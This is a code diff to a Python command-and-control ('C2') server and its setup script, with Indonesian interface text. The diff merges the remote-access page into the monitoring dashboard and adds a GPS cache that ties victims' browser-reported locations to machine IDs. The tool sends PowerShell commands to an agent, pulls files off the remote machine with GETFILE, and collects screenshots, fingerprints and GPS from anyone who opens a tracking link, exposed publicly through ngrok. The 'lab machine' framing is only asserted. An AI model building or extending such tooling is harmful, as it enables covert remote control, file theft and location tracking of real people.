@@ -64,6 +64,7 @@ RESULT_PATH = "/result"
 events = []
 loc_cache = {}
 addr_cache = {}
+gps_cache = {}
 commands = []
 done_cids = set()
 
@@ -218,6 +219,28 @@ def pending_commands(machine):
     return [c for c in commands if c.get("machine") == machine and c.get("cid") not in done_cids]
 
 
+def load_gps_cache():
+    for ev in events:
+        if ev.get("type") == "gps":
+            d = ev.get("detail") or {}
+            if d.get("lat") is not None and d.get("lon") is not None:
+                entry = {"lat": d.get("lat"), "lon": d.get("lon"),
+                         "accuracy": d.get("accuracy"), "address": d.get("address", "")}
+                gps_cache["ip:" + ev.get("ip", "")] = entry
+                if d.get("machine"):
+                    gps_cache["id:" + d.get("machine")] = entry
+
+
+def resolve_location(client_ip, machine):
+    for key in (f"ip:{client_ip}", f"id:{machine}"):
+        g = gps_cache.get(key)
+        if g:
+            if g.get("address"):
+                return g["address"] + " (GPS)"
+            return f"GPS: {g.get('lat')}, {g.get('lon')}"
+    return geolocate(client_ip)
+
+
 TRACKER_PAGE = """<!DOCTYPE html>
 <html lang="id">
 <head>
@@ -255,7 +278,7 @@ sendFingerprint();
 </body>
 </html>"""
 
-DASHBOARD_PAGE = """<!DOCTYPE html>
+DASHBOARD_PAGE = r"""<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
@@ -264,6 +287,7 @@ DASHBOARD_PAGE = """<!DOCTYPE html>
 <style>
 body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:#0f172a; color:#e2e8f0; margin:0; padding:24px; }
 h1 { font-size:20px; margin:0 0 4px; }
+h2 { font-size:15px; margin:0 0 4px; }
 .sub { color:#94a3b8; font-size:12px; margin-bottom:20px; }
 .stats { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:20px; }
 .card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:14px 20px; min-width:120px; }
@@ -281,6 +305,20 @@ tr:hover td { background:#24324a; }
 .b-result { background:#2d1050; color:#c084fc; }
 .detail { max-width:420px; word-break:break-all; color:#cbd5e1; font-size:12px; }
 a { color:#38bdf8; }
+b { color:#c084fc; }
+hr { border:0; border-top:1px solid #334155; margin:28px 0; }
+.remote { display:flex; gap:20px; flex-wrap:wrap; align-items:flex-start; }
+.remote .panel { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:18px; }
+.remote .left { flex:1; min-width:280px; }
+.remote .right { flex:2; min-width:340px; }
+label { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; display:block; margin:12px 0 4px; }
+input[type=text], textarea { width:100%; background:#0b1220; color:#e2e8f0; border:1px solid #334155; border-radius:6px; padding:10px; font:13px ui-monospace, Menlo, monospace; box-sizing:border-box; }
+textarea { min-height:110px; resize:vertical; }
+button { background:#38bdf8; color:#0f172a; border:0; border-radius:6px; padding:10px 18px; font-weight:700; cursor:pointer; margin-top:12px; }
+button:hover { background:#7dd3fc; }
+.q { display:inline-block; background:#0b1220; border:1px solid #334155; color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:11px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
+.q:hover { background:#1e293b; }
+pre { background:#0b1220; border:1px solid #334155; border-radius:6px; padding:10px; font-size:12px; overflow:auto; max-height:240px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
 </style>
 </head>
 <body>
@@ -298,7 +336,32 @@ a { color:#38bdf8; }
 <thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID</th><th>Lokasi</th><th>Detail</th></tr></thead>
 <tbody id="rows"></tbody>
 </table>
-<div class="sub" style="margin-top:16px">Auto-refresh 3 detik. Menampilkan 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a> | <a href="/remote">Remote Access (akses mesin lab)</a></div>
+<div class="sub" style="margin-top:16px">Auto-refresh 3 detik. Menampilkan 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>
+
+<hr>
+<h2 id="remote">Remote Access - Isi Mesin Lab</h2>
+<div class="sub">Agent menjalankan perintah di PowerShell mesin lab. Format khusus: <b>GETFILE C:\path\file</b> untuk mengunduh file ke server.</div>
+<div class="remote">
+<div class="panel left">
+  <label>ID Mesin</label>
+  <input type="text" id="machine" value="win-lab-1">
+  <label>Perintah (PowerShell)</label>
+  <textarea id="cmd" placeholder="whoami"></textarea>
+  <div>
+    <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
+    <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
+    <span class="q">systeminfo</span>
+    <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
+  </div>
+  <button onclick="sendCmd()">Kirim Perintah</button>
+  <div class="sub" id="status" style="margin-top:10px"></div>
+</div>
+<div class="panel right">
+  <label>Hasil Perintah</label>
+  <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
+</div>
+</div>
+
 <script>
 var Q = location.search;
 function esc(s) {
@@ -360,76 +423,19 @@ function render(ev) {
         tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
         rows.appendChild(tr);
     }
+    var cmdRows = document.getElementById("cmdRows");
+    cmdRows.innerHTML = "";
+    var list = ev.filter(function(e) { return e.type === "result"; });
+    for (var k = 0; k < list.length; k++) {
+        var e = list[k];
+        var d = e.detail || {};
+        var dl = d.file_name ? ' <a href="/file/' + encodeURIComponent(d.file_name) + '" download>unduh</a>' : "";
+        var tr = document.createElement("tr");
+        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
+        cmdRows.appendChild(tr);
+    }
 }
 document.getElementById("exportLink").href = "/export" + Q;
-refresh();
-setInterval(refresh, 3000);
-</script>
-</body>
-</html>"""
-
-REMOTE_PAGE = r"""<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>C2 Monitor - Remote Access</title>
-<style>
-body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:#0f172a; color:#e2e8f0; margin:0; padding:24px; }
-h1 { font-size:20px; margin:0 0 4px; }
-.sub { color:#94a3b8; font-size:12px; margin-bottom:20px; }
-.layout { display:grid; grid-template-columns:1fr 1.4fr; gap:20px; align-items:start; }
-@media (max-width:900px){ .layout { grid-template-columns:1fr; } }
-.card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:18px; margin-bottom:20px; }
-label { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; display:block; margin:12px 0 4px; }
-input[type=text], textarea { width:100%; background:#0b1220; color:#e2e8f0; border:1px solid #334155; border-radius:6px; padding:10px; font:13px ui-monospace, Menlo, monospace; box-sizing:border-box; }
-textarea { min-height:110px; resize:vertical; }
-button { background:#38bdf8; color:#0f172a; border:0; border-radius:6px; padding:10px 18px; font-weight:700; cursor:pointer; margin-top:12px; }
-button:hover { background:#7dd3fc; }
-.q { display:inline-block; background:#0b1220; border:1px solid #334155; color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:11px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
-.q:hover { background:#1e293b; }
-pre { background:#0b1220; border:1px solid #334155; border-radius:6px; padding:10px; font-size:12px; overflow:auto; max-height:240px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
-table { width:100%; border-collapse:collapse; background:#1e293b; border-radius:8px; overflow:hidden; }
-th, td { text-align:left; padding:8px 10px; font-size:12px; border-bottom:1px solid #334155; vertical-align:top; }
-th { background:#0b1220; color:#94a3b8; font-size:11px; text-transform:uppercase; }
-a { color:#38bdf8; }
-b { color:#c084fc; }
-</style>
-</head>
-<body>
-<h1>C2 Monitor - Remote Access</h1>
-<div class="sub"><a href="/dashboard">Dashboard</a> | Agent menjalankan perintah di PowerShell mesin lab. Format khusus: <b>GETFILE C:\path\file</b> untuk mengunduh file ke server.</div>
-<div class="layout">
-<div>
-  <div class="card">
-    <label>ID Mesin</label>
-    <input type="text" id="machine" value="win-lab-1">
-    <label>Perintah (PowerShell)</label>
-    <textarea id="cmd" placeholder="whoami"></textarea>
-    <div>
-      <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
-      <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
-      <span class="q">systeminfo</span>
-      <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
-    </div>
-    <button onclick="sendCmd()">Kirim Perintah</button>
-    <div class="sub" id="status" style="margin-top:10px"></div>
-  </div>
-</div>
-<div>
-  <div class="card">
-    <label>Hasil Perintah</label>
-    <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="rows"></tbody></table>
-  </div>
-</div>
-</div>
-<script>
-var Q = location.search;
-function esc(s) {
-    return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
-        return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
-    });
-}
 document.querySelectorAll(".q").forEach(function(el) {
     el.addEventListener("click", function() { document.getElementById("cmd").value = el.textContent; });
 });
@@ -444,24 +450,6 @@ async function sendCmd() {
         var r = await fetch("/cmd", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body});
         st.textContent = r.ok ? "Terkirim! Agent akan menjalankan dalam beberapa detik." : "Gagal kirim: " + r.status;
     } catch(e) { st.textContent = "Server tidak merespon."; }
-}
-async function refresh() {
-    try {
-        var r = await fetch("/api/events" + Q);
-        if (!r.ok) { return; }
-        var ev = await r.json();
-        var rows = document.getElementById("rows");
-        rows.innerHTML = "";
-        var list = ev.filter(function(e) { return e.type === "result"; });
-        for (var j = 0; j < list.length; j++) {
-            var e = list[j];
-            var d = e.detail || {};
-            var dl = d.file_name ? ' <a href="/file/' + encodeURIComponent(d.file_name) + '" download>unduh</a>' : "";
-            var tr = document.createElement("tr");
-            tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
-            rows.appendChild(tr);
-        }
-    } catch(err) {}
 }
 refresh();
 setInterval(refresh, 3000);
@@ -509,7 +497,12 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             if path == DASHBOARD_PATH:
                 self._send(200, "text/html; charset=utf-8", DASHBOARD_PAGE.encode("utf-8"))
             elif path == REMOTE_PATH:
-                self._send(200, "text/html; charset=utf-8", REMOTE_PAGE.encode("utf-8"))
+                dest = DASHBOARD_PATH + (("?" + parsed.query) if parsed.query else "")
+                self.send_response(302)
+                self.send_header("Location", dest)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
             elif path == API_EVENTS_PATH:
                 body = json.dumps(list(reversed(events)), ensure_ascii=False).encode("utf-8")
                 self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
@@ -566,7 +559,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         client_ip = self.real_client_ip()
         t = now_str()
         tracking_id = query.get("id", [""])[0] or "-"
-        location = geolocate(client_ip)
+        location = resolve_location(client_ip, tracking_id)
         fname = os.path.join(LOG_DIR, f"click_{client_ip}_{file_ts()}.log")
         content = f"IP: {client_ip}\nWaktu: {t}\nPath: {parsed.path}\nID: {tracking_id}\nLokasi: {location}\n"
         try:
@@ -593,6 +586,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         try:
             parsed = urllib.parse.urlparse(self.path)
             path = parsed.path
+            parsed_query = urllib.parse.parse_qs(parsed.query)
             content_length = int(self.headers.get("Content-Length", 0))
             post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")
             parsed_data = urllib.parse.parse_qs(post_data)
@@ -600,6 +594,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             if not data_payload:
                 data_payload = post_data
             dtype = parsed_data.get("type", [""])[0]
+            machine = parsed_query.get("id", [""])[0] or parsed_data.get("machine", [""])[0] or "-"
             client_ip = self.real_client_ip()
             t = now_str()
 
@@ -632,7 +627,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                         emit(f" [!] Gagal simpan file dari agent: {e}")
                 record_event({
                     "time": t, "type": "result", "ip": client_ip, "id": machine, "cid": cid,
-                    "path": "/", "location": geolocate(client_ip), "detail": detail, "file": fname
+                    "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
                 })
                 done_cids.add(cid)
                 emit("=" * 60)
@@ -679,6 +674,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 lat = detail.get("lat")
                 lon = detail.get("lon")
                 addr = reverse_geocode(lat, lon) if lat and lon else ""
+                detail["machine"] = machine
+                if lat is not None and lon is not None:
+                    gps_cache["ip:" + client_ip] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
+                    gps_cache["id:" + machine] = {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}
                 fname = os.path.join(LOG_DIR, f"gps_{client_ip}_{file_ts()}.log")
                 try:
                     with open(fname, "w", encoding="utf-8") as f:
@@ -686,9 +685,9 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 except Exception as e:
                     emit(f" [!] Gagal simpan gps: {e}")
                 record_event({
-                    "time": t, "type": "gps", "ip": client_ip, "id": "beacon",
-                    "path": "/", "location": addr or geolocate(client_ip),
-                    "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}, "file": fname
+                    "time": t, "type": "gps", "ip": client_ip, "id": machine,
+                    "path": "/", "location": addr or resolve_location(client_ip, machine),
+                    "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr, "machine": machine}, "file": fname
                 })
                 emit("=" * 60)
                 emit(" [+] GPS DITERIMA (dari browser)")
@@ -710,8 +709,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 with open(fname, "wb") as f:
                     f.write(png)
                 record_event({
-                    "time": t, "type": "screenshot", "ip": client_ip, "id": "beacon",
-                    "path": "/", "location": geolocate(client_ip),
+                    "time": t, "type": "screenshot", "ip": client_ip, "id": machine,
+                    "path": "/", "location": resolve_location(client_ip, machine),
                     "detail": {"bytes": len(png), "size_kb": round(len(png) / 1024, 1)}, "file": fname
                 })
                 emit("=" * 60)
@@ -732,8 +731,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             except ValueError:
                 detail = data_payload
             record_event({
-                "time": t, "type": "data", "ip": client_ip, "id": "beacon",
-                "path": "/", "location": geolocate(client_ip), "detail": detail, "file": fname
+                "time": t, "type": "data", "ip": client_ip, "id": machine,
+                "path": "/", "location": resolve_location(client_ip, machine), "detail": detail, "file": fname
             })
             emit("=" * 60)
             emit(" [+] PAKET DATA DITERIMA")
@@ -756,6 +755,7 @@ def main():
     os.makedirs(LOG_DIR, exist_ok=True)
     load_events()
     load_commands()
+    load_gps_cache()
     server_address = ("", PORT)
     httpd = http.server.HTTPServer(server_address, C2Handler)
     ip = local_ip()
@@ -766,12 +766,9 @@ def main():
     emit("[*] LINK PELACAK (kirim ke mesin lab):")
     emit("    http://%s:%d/?id=lab-1" % (ip, PORT))
     emit("")
-    emit("[*] DASHBOARD MONITORING (buka di browser):")
+    emit("[*] DASHBOARD (monitoring + remote access dalam satu halaman):")
     suffix = "?pass=xxx" if DASH_PASS else ""
     emit("    http://%s:%d/dashboard%s" % (ip, PORT, suffix))
-    emit("")
-    emit("[*] REMOTE ACCESS (akses isi mesin lab):")
-    emit("    http://%s:%d/remote%s" % (ip, PORT, suffix))
     emit("")
     emit("[*] Tekan Ctrl+C untuk menghentikan server.")
     try:
@@ -989,16 +986,10 @@ echo " [1] Tracking link - READY TO SEND to Windows lab machine:"
 echo "     http://${SERVER_IP}:${PORT}/?id=lab-1"
 echo "     (opsional: ganti 'lab-1' dengan nama unik mesin, misal ?id=win-lab-2)"
 echo ""
-echo " [2] Dashboard monitoring (buka di browser):"
+echo " [2] Dashboard (monitoring + Remote Access mesin lab dalam satu halaman):"
 echo "     http://${SERVER_IP}:${PORT}/dashboard"
 if [ -n "$TS_IP" ]; then
     echo "     (via Tailscale: http://${TS_IP}:${PORT}/dashboard)"
-fi
-echo ""
-echo " [2b] Remote Access (akses isi mesin lab):"
-echo "     http://${SERVER_IP}:${PORT}/remote"
-if [ -n "$TS_IP" ]; then
-    echo "     (via Tailscale: http://${TS_IP}:${PORT}/remote)"
 fi
 echo ""
 echo " [3] Restart semua service (systemd):  sudo systemctl restart c2-listener c2-ngrok"
@@ -1022,10 +1013,8 @@ echo " URL AKHIR"
 if [ -n "$NGROK_URL" ]; then
 echo " [NGROK] Dashboard : $NGROK_URL/dashboard"
 echo " [NGROK] Link lab  : $NGROK_URL/?id=lab-1"
-echo " [NGROK] Remote    : $NGROK_URL/remote"
-echo "         (bisa dibuka dari mana saja / tembus proxy browser)"
+echo "         (dashboard berisi monitoring + remote access; bisa tembus proxy browser)"
 fi
 echo " [LAN]  Dashboard : http://${SERVER_IP}:${PORT}/dashboard"
 echo " [LAN]  Link lab  : http://${SERVER_IP}:${PORT}/?id=lab-1"
-echo " [LAN]  Remote    : http://${SERVER_IP}:${PORT}/remote"
 echo "=================================================================="
